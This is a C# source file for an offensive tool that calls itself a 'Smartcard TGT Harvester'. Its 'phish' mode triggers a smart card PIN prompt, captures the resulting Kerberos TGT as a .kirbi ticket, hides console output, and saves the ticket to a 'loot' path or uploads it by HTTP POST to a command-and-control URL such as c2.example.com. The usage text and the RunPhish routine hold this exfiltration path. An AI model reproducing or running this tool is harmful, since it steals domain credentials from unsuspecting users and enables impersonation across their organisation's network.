using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using DnsClient;
using DnsClient.Protocol;
using Kerberos.NET.Client;
using Kerberos.NET.Configuration;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;


public class KerberosSmartCardAuthenticator
{
    #region KDC and Certificate Discovery

    public class KdcInfo
    {
        // satisfies CS8618 (non-nullable property must be initialised).
        public required string Target { get; set; }
        public ushort Port { get; set; }
        public ushort Priority { get; set; }
        public ushort Weight { get; set; }
    }

    public async Task<List<KdcInfo>> DiscoverAndSortKdcsAsync(string domain)
    {
        var lookup = new LookupClient();
        string query = $"_kerberos._tcp.dc._msdcs.{domain}";
        var result = await lookup.QueryAsync(query, QueryType.SRV);

        if (result.HasError)
        {
            Console.WriteLine($"[!] Error querying DNS: {result.ErrorMessage}");
            return new List<KdcInfo>();
        }

        var srvRecords = result.Answers.SrvRecords().Select(r => new KdcInfo
        {
            Priority = r.Priority,
            Weight = r.Weight,
            Port = r.Port,
            Target = r.Target.Value.TrimEnd('.')
        }).ToList();

        return SortKdcsByPriorityAndWeight(srvRecords);
    }

    private static List<KdcInfo> SortKdcsByPriorityAndWeight(List<KdcInfo> records)
    {
        var sortedKdcs = new List<KdcInfo>();
        var random = new Random();

        foreach (var group in records.GroupBy(r => r.Priority).OrderBy(g => g.Key))
        {
            var priorityGroup = group.ToList();
            while (priorityGroup.Count > 0)
            {
                int totalWeight = priorityGroup.Sum(r => r.Weight);
                if (totalWeight == 0)
                {
                    int idx = random.Next(priorityGroup.Count);
                    sortedKdcs.Add(priorityGroup[idx]);
                    priorityGroup.RemoveAt(idx);
                    continue;
                }

                int randomWeight = random.Next(1, totalWeight + 1);
                int runningWeight = 0;
                KdcInfo? selected = null;

                foreach (var record in priorityGroup)
                {
                    runningWeight += record.Weight;
                    if (randomWeight <= runningWeight) { selected = record; break; }
                }

                if (selected != null)
                {
                    sortedKdcs.Add(selected);
                    priorityGroup.Remove(selected);
                }
            }
        }
        return sortedKdcs;
    }

    public List<X509Certificate2> FindAllSmartCardCertificates()
    {
        const string smartCardLogonOid = "1.3.6.1.4.1.311.20.2.2";
        var validCerts = new List<X509Certificate2>();

        using var store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
        store.Open(OpenFlags.ReadOnly);

        foreach (X509Certificate2 cert in store.Certificates)
        {
            if (!cert.HasPrivateKey || DateTime.Now < cert.NotBefore || DateTime.Now > cert.NotAfter)
                continue;

            bool hasEku = cert.Extensions
                .OfType<X509EnhancedKeyUsageExtension>()
                .Any(eku => eku.EnhancedKeyUsages.Cast<Oid>()
                    .Any(oid => oid.Value == smartCardLogonOid));

            if (!hasEku) continue;

            try
            {
                using var rsa = cert.GetRSAPrivateKey();
                bool isSmartCard = false;

                if (rsa is RSACryptoServiceProvider rsaCsp)
                {
                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    {
                        string pn = rsaCsp.CspKeyContainerInfo.ProviderName ?? string.Empty;
                        isSmartCard = IsKnownSmartCardProvider(pn);
                    }
                }
                else if (rsa is RSACng rsaCng)
                {
                    string pn = rsaCng.Key.Provider?.Provider ?? string.Empty;
                    isSmartCard = IsKnownSmartCardProvider(pn);
                }

                if (isSmartCard) validCerts.Add(cert);
            }
            catch { /* Private key inaccessible */ }
        }

        return validCerts;
    }

    public X509Certificate2? FindSmartCardCertificate()
    {
        return FindSmartCardCertificate(autoSelect: false);
    }

    public X509Certificate2? FindSmartCardCertificate(bool autoSelect)
    {
        var validCerts = FindAllSmartCardCertificates();

        if (validCerts.Count == 0) return null;
        if (validCerts.Count == 1 || autoSelect) return validCerts[0];
        return SelectCertificateFromConsole(validCerts);
    }

    private static bool IsKnownSmartCardProvider(string providerName)
    {
        if (string.IsNullOrEmpty(providerName)) return false;
        var known = new[]
        {
            "Smart Card", "Microsoft Base Smart Card", "Microsoft Smart Card Key Storage",
            "Gemalto", "SafeNet", "Entrust", "YubiKey", "OpenSC", "eToken",
        };
        return known.Any(p => providerName.IndexOf(p, StringComparison.OrdinalIgnoreCase) >= 0);
    }

    /// <summary>
    /// Cross-platform console certificate selector.
    /// </summary>
    private static X509Certificate2 SelectCertificateFromConsole(List<X509Certificate2> certs)
    {
        Console.WriteLine("\n[*] Multiple smart card certificates found. Please select one:");
        for (int i = 0; i < certs.Count; i++)
        {
            Console.WriteLine($"  [{i + 1}] Subject   : {certs[i].Subject}");
            Console.WriteLine($"       Thumbprint : {certs[i].Thumbprint}");
            Console.WriteLine($"       Expires    : {certs[i].NotAfter:yyyy-MM-dd}");
        }
        while (true)
        {
            Console.Write($"\nEnter selection (1-{certs.Count}): ");
            string? input = Console.ReadLine();
            if (int.TryParse(input, out int choice) && choice >= 1 && choice <= certs.Count)
                return certs[choice - 1];
            Console.WriteLine("[!] Invalid selection, please try again.");
        }
    }

    /// <summary>
    /// Extracts the UPN from the Subject Alternative Name extension.
    /// </summary>
    public string? GetUpnFromCertificate(X509Certificate2 cert)
    {
        var sanExt = cert.Extensions
            .Cast<X509Extension>()
            .FirstOrDefault(e => e.Oid?.Value == "2.5.29.17");

        if (sanExt == null) return null;

        string sanText = new AsnEncodedData(sanExt.Oid, sanExt.RawData).Format(false);
        var patterns = new[]
        {
            @"User Principal Name=([^\s,]+)",
            @"UPN=([^\s,]+)",
            @"upn=([^\s,]+)",
            @"1\.3\.6\.1\.4\.1\.311\.20\.2\.3=([^\s,]+)",
        };

        foreach (var pattern in patterns)
        {
            var m = Regex.Match(sanText, pattern, RegexOptions.IgnoreCase);
            if (m.Success) return m.Groups[1].Value.Trim();
        }

        return TryParseUpnFromRawSan(sanExt.RawData);
    }

    private static string? TryParseUpnFromRawSan(byte[] rawData)
    {
        byte[] upnOid = { 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03 };
        int oidPos = FindBytes(rawData, upnOid);
        if (oidPos < 0) return null;

        for (int i = oidPos + upnOid.Length; i < rawData.Length - 2; i++)
        {
            if (rawData[i] == 0x0C || rawData[i] == 0x16)
            {
                int len = rawData[i + 1];
                if ((len & 0x80) != 0)
                {
                    int lb = len & 0x7F;
                    if (i + 1 + lb >= rawData.Length) break;
                    len = 0;
                    for (int j = 0; j < lb; j++) len = (len << 8) | rawData[i + 2 + j];
                    i += lb;
                }
                int vs = i + 2;
                if (vs + len <= rawData.Length)
                    return System.Text.Encoding.UTF8.GetString(rawData, vs, len);
            }
        }
        return null;
    }

    private static int FindBytes(byte[] haystack, byte[] needle)
    {
        for (int i = 0; i <= haystack.Length - needle.Length; i++)
        {
            bool ok = true;
            for (int j = 0; j < needle.Length; j++)
                if (haystack[i + j] != needle[j]) { ok = false; break; }
            if (ok) return i;
        }
        return -1;
    }

    #endregion
}

public class Program
{
    private const int EXIT_SUCCESS = 0;
    private const int EXIT_NO_SMARTCARD = 1;
    private const int EXIT_AUTH_FAILED = 2;
    private const int EXIT_OUTPUT_FAILED = 3;

    private static bool _verbose = false;

    private static void Log(string message)
    {
        if (_verbose) Console.WriteLine(message);
    }

    private static void PrintUsage()
    {
        Console.WriteLine(@"Smarties - Smartcard TGT Harvester (PKINIT)

Usage: smarties.exe <command> [options]

Commands:
  enum    Enumerate smartcard certificates and exit
  phish   Trigger PKINIT auth (PIN prompt), capture TGT

Options:
  --output <path>   Write .kirbi to file (default: %TEMP%\<user>.kirbi)
  --upload <url>    HTTP POST .kirbi to URL
  --auto            Auto-select first smartcard cert (no interactive prompt)
  --verbose         Enable debug output (default: quiet)

Examples:
  smarties.exe enum
  smarties.exe phish --auto --upload https://c2.example.com/upload
  smarties.exe phish --auto --output C:\loot\ticket.kirbi
  smarties.exe phish --auto

Exit codes: 0=success, 1=no smartcard, 2=auth failed, 3=output failed");
    }

    public static async Task<int> Main(string[] args)
    {
        string? command = null;
        string? outputPath = null;
        string? uploadUrl = null;
        bool autoSelect = false;

        for (int i = 0; i < args.Length; i++)
        {
            string arg = args[i].ToLowerInvariant();
            switch (arg)
            {
                case "enum":
                case "phish":
                    command = arg;
                    break;
                case "--output":
                case "-o":
                    if (i + 1 < args.Length) outputPath = args[++i];
                    break;
                case "--upload":
                case "-u":
                    if (i + 1 < args.Length) uploadUrl = args[++i];
                    break;
                case "--auto":
                case "-a":
                    autoSelect = true;
                    break;
                case "--verbose":
                case "-v":
                    _verbose = true;
                    break;
                case "--help":
                case "-h":
                case "help":
                    PrintUsage();
                    return EXIT_SUCCESS;
            }
        }

        // Suppress all Console output when not verbose.
        // This silences both Program.cs Log() calls AND the debug
        // Console.WriteLines in WindowsPkinitCredential.cs without
        // modifying that file.
        TextWriter originalOut = Console.Out;
        if (!_verbose)
        {
            Console.SetOut(TextWriter.Null);
        }

        if (string.IsNullOrEmpty(command))
        {
            Console.SetOut(originalOut);
            PrintUsage();
            return EXIT_SUCCESS;
        }

        var authenticator = new KerberosSmartCardAuthenticator();

        if (command == "enum")
        {
            return RunEnum(authenticator, originalOut);
        }

        return await RunPhish(authenticator, autoSelect, outputPath, uploadUrl, originalOut);
    }

    private static int RunEnum(KerberosSmartCardAuthenticator authenticator, TextWriter output)
    {
        var certs = authenticator.FindAllSmartCardCertificates();

        if (certs.Count == 0)
        {
            output.WriteLine("[!] No smartcard certificates found.");
            return EXIT_NO_SMARTCARD;
        }

        output.WriteLine($"[+] Found {certs.Count} smartcard certificate(s):\n");
        for (int i = 0; i < certs.Count; i++)
        {
            string? upn = authenticator.GetUpnFromCertificate(certs[i]);
            output.WriteLine($"  [{i + 1}] Subject    : {certs[i].Subject}");
            output.WriteLine($"      UPN        : {upn ?? "(none)"}");
            output.WriteLine($"      Thumbprint : {certs[i].Thumbprint}");
            output.WriteLine($"      Issuer     : {certs[i].Issuer}");
            output.WriteLine($"      Valid      : {certs[i].NotBefore:yyyy-MM-dd} to {certs[i].NotAfter:yyyy-MM-dd}");
            output.WriteLine();
        }

        foreach (var c in certs) c.Dispose();
        return EXIT_SUCCESS;
    }

    private static async Task<int> RunPhish(
        KerberosSmartCardAuthenticator authenticator,
        bool autoSelect,
        string? outputPath,
        string? uploadUrl,
        TextWriter output)
    {
        Log("[*] Locating smart card certificate...");
        X509Certificate2? certificate = authenticator.FindSmartCardCertificate(autoSelect);

        if (certificate == null)
        {
            Log("[!] No suitable smart card certificate found.");
            return EXIT_NO_SMARTCARD;
        }

        using (certificate)
        {
            Log($"[+] Found certificate: {certificate.Subject}");

            string? upn = authenticator.GetUpnFromCertificate(certificate);
            if (string.IsNullOrEmpty(upn))
            {
                Log("[!] Certificate does not contain a UPN.");
                return EXIT_NO_SMARTCARD;
            }
            Log($"[+] UPN: {upn}");

            string domain = upn.Split('@').Last();
            Log($"[+] Domain: {domain}");

            Log("[*] Discovering KDCs...");
            var kdcs = await authenticator.DiscoverAndSortKdcsAsync(domain);
            if (kdcs.Count > 0)
                Log($"[+] Found {kdcs.Count} KDC(s). Highest priority: {kdcs.First().Target}");
            else
                Log("[!] No KDCs found via DNS SRV.");

            Log("[*] Requesting TGT via PKINIT (PIN prompt may appear)...");

            byte[] kirbi;
            try
            {
                kirbi = await RequestTgtViaPkinit(certificate, upn, domain);
            }
            catch (Exception ex)
            {
                Log($"[-] TGT request failed: {ex.Message}");
                if (ex.InnerException != null)
                    Log($"    Inner: {ex.InnerException.Message}");
                Log($"    Stack: {ex.StackTrace}");
                return EXIT_AUTH_FAILED;
            }

            if (kirbi == null || kirbi.Length == 0)
            {
                Log("[-] kirbi bytes are null or empty.");
                return EXIT_AUTH_FAILED;
            }

            Log($"[+] TGT captured ({kirbi.Length} bytes)");

            bool writeFile = outputPath != null;
            bool doUpload = uploadUrl != null;

            // Default: write to %TEMP%\<samaccountname>.kirbi
            if (!writeFile && !doUpload)
            {
                string tempDir = Environment.GetEnvironmentVariable("TEMP")
                    ?? Environment.GetEnvironmentVariable("TMP")
                    ?? Path.GetTempPath();
                string username = upn.Split('@')[0];
                outputPath = Path.Combine(tempDir, $"{username}.kirbi");
                writeFile = true;
            }

            // Write .kirbi to file
            if (writeFile && outputPath != null)
            {
                try
                {
                    string? dir = Path.GetDirectoryName(outputPath);
                    if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                        Directory.CreateDirectory(dir);

                    File.WriteAllBytes(outputPath, kirbi);
                    Log($"[+] Wrote {kirbi.Length} bytes to {outputPath}");

                    // Always print the file path even in quiet mode so
                    // the operator knows where the ticket landed
                    output.WriteLine(outputPath);
                }
                catch (Exception ex)
                {
                    Log($"[-] Failed to write .kirbi: {ex.Message}");
                    return EXIT_OUTPUT_FAILED;
                }
            }

            // HTTP upload
            if (doUpload && uploadUrl != null)
            {
                try
                {
                    using var http = new HttpClient();
                    http.Timeout = TimeSpan.FromSeconds(30);

                    var content = new MultipartFormDataContent();
                    content.Add(
                        new ByteArrayContent(kirbi),
                        "ticket",
                        $"{upn.Split('@')[0]}.kirbi"
                    );

                    Log($"[*] Uploading TGT to {uploadUrl} ...");
                    var response = await http.PostAsync(uploadUrl, content);

                    Log($"[+] Server response: {((int)response.StatusCode)} {response.ReasonPhrase}");
                    string body = await response.Content.ReadAsStringAsync();
                    if (!string.IsNullOrWhiteSpace(body))
                        Log($"[+] Body: {body}");

                    if (!response.IsSuccessStatusCode)
                        return EXIT_OUTPUT_FAILED;
                }
                catch (Exception ex)
                {
                    Log($"[-] Upload failed: {ex.Message}");
                    return EXIT_OUTPUT_FAILED;
                }
            }
        }

        return EXIT_SUCCESS;
    }

    private static async Task<byte[]> RequestTgtViaPkinit(X509Certificate2 cert, string upn, string domain)
    {
        var config = Krb5Config.CurrentUser();
        config.Defaults.DefaultRealm = domain.ToUpperInvariant();

        var credential = new WindowsPkinitCredential(cert, upn)
        {
            Domain = domain.ToUpperInvariant(),
            IncludeOption = X509IncludeOption.WholeChain
        };

        using var client = new KerberosClient(config);
        await client.Authenticate(credential);

        string realm = domain.ToUpperInvariant();
        string tgtKey = $"krbtgt/{realm}";
        var entry = client.Cache.GetCacheItem<KerberosClientCacheEntry>(tgtKey);

        if (entry.KdcResponse == null)
        {
            tgtKey = $"krbtgt/{domain.ToLowerInvariant()}";
            entry = client.Cache.GetCacheItem<KerberosClientCacheEntry>(tgtKey);
        }

        if (entry.KdcResponse == null)
            throw new InvalidOperationException(
                "Authentication succeeded but the TGT could not be found in the ticket cache. " +
                $"Tried: 'krbtgt/{realm}' and 'krbtgt/{domain.ToLowerInvariant()}'.");

        return EncodeKirbi(entry);
    }

    private static byte[] EncodeKirbi(KerberosClientCacheEntry entry)
    {
        var credInfo = new KrbCredInfo
        {
            Key = entry.SessionKey,
            Realm = entry.KdcResponse.CRealm,
            PName = entry.KdcResponse.CName,
            Flags = entry.Flags,
            AuthTime = entry.AuthTime,
            StartTime = entry.StartTime,
            EndTime = entry.EndTime,
            RenewTill = entry.RenewTill,
            SRealm = entry.KdcResponse.Ticket.Realm,
            SName = entry.SName,
        };

        var encCredPart = new KrbEncKrbCredPart
        {
            TicketInfo = new[] { credInfo }
        };

        var krbCred = new KrbCred
        {
            Tickets = new[] { entry.KdcResponse.Ticket },
            EncryptedPart = new KrbEncryptedData
            {
                EType = EncryptionType.NULL,
                Cipher = encCredPart.EncodeApplication()
            }
        };

        return krbCred.EncodeApplication().ToArray();
    }
}
